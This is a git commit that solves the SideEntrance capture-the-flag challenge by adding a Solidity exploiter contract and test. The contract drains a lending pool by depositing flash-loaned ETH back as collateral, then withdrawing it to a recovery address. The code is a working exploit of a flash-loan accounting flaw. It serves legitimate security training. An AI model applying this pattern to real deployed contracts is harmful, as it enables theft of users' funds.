50e9c0c2a09c7d27c9ea5d1f6707374d2f33997f
Ubaid Ch <ubaidullahchaudhry01@gmail.com>
2025-06-29 11:02:50 +0500

    SideEntrance Challenge Solved

--- test/side-entrance/SideEntrance.t.sol
+++ test/side-entrance/SideEntrance.t.sol
@@ -4,6 +4,33 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+contract SideEntranceExploiter {
+    
+    SideEntranceLenderPool public pool;
+    address public recovery;
+
+    constructor(SideEntranceLenderPool _pool, address _recovery) {
+        pool = _pool;
+        recovery = _recovery;
+    }
+
+    function startAttack() public {
+        // Request a flash loan with all the balance in the pool
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+    }
+    
+    // The callback function after the flashloan
+    function execute() public payable {
+        // Deposit the received ETH back to the pool
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {
+        // Transfer the ETH to the recovery account
+        payable(recovery).transfer(address(this).balance);
+    }
+}
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -45,7 +72,11 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        // Deploy the exploiter
+        SideEntranceExploiter exploiter = new SideEntranceExploiter(pool, recovery);
+        // Start the attack
+        exploiter.startAttack();
+
     }
 
     /**
